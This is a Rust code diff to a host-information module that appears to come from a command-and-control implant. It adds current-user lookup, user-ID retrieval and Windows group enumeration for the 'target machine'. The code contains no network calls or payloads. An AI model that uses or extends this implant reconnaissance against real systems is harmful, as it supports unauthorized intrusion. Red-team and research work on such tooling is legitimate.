@@ -1,16 +1,31 @@
 // Get info about the target machine
 use crate::pb::registration::User;
-use anyhow::{Context, Result};
-use sysinfo::{PidExt, SystemExt};
+use anyhow::{Context, Ok, Result};
+use sysinfo::{PidExt, RefreshKind, SystemExt, UserExt};
 
 pub struct Info {
     system: sysinfo::System,
+    username: String,
+}
+
+// Macro to get the current user
+macro_rules! current_user {
+    ($self:ident) => {
+        $self
+            .system
+            .users()
+            .iter()
+            .find(|u| u.name() == $self.username)
+            .context(0)
+    };
 }
 
 impl Info {
     pub fn new() -> Info {
-        let system = sysinfo::System::new();
-        Info { system }
+        Info {
+            system: sysinfo::System::new_with_specifics(RefreshKind::new().with_users_list()),
+            username: whoami::username(),
+        }
     }
 
     // Get the current operating system name by parsing /etc/os-release
@@ -25,18 +40,30 @@ impl Info {
 
     // Get the user running the implant
     pub fn user(&self) -> Result<User> {
+        let current_user = self
+            .system
+            .users()
+            .iter()
+            .find(|u| u.name() == self.username)
+            .context(0)?;
+
         let u = User {
-            id: users::get_current_uid(),
-            name: users::get_current_username()
-                .context(0)?
-                .into_string()
-                .ok()
-                .context(0)?,
+            id: self.get_id()?,
+            name: current_user.name().to_string(),
         };
+
         Ok(u)
     }
 
-    // TODO: Get the groups this user is a part of
+    fn get_id(&self) -> Result<u32> {
+        Ok(current_user!(self)?
+            .id()
+            .to_string()
+            .parse()
+            .unwrap_or_else(|_| u32::MAX))
+    }
+
+    #[cfg(target_os = "linux")]
     pub fn groups(&self) -> Result<Vec<User>> {
         let g = User {
             id: users::get_current_gid(),
@@ -47,5 +74,19 @@ impl Info {
                 .context(0)?,
         };
         Ok(vec![g])
+    }
+
+    #[cfg(target_os = "windows")]
+    pub fn groups(&self) -> Result<Vec<User>> {
+        let g = current_user!(self)?
+            .groups()
+            .iter()
+            .map(|groupname| User {
+                id: 0,
+                name: groupname.to_string(),
+            })
+            .collect();
+
+        Ok(g)
     }
 }
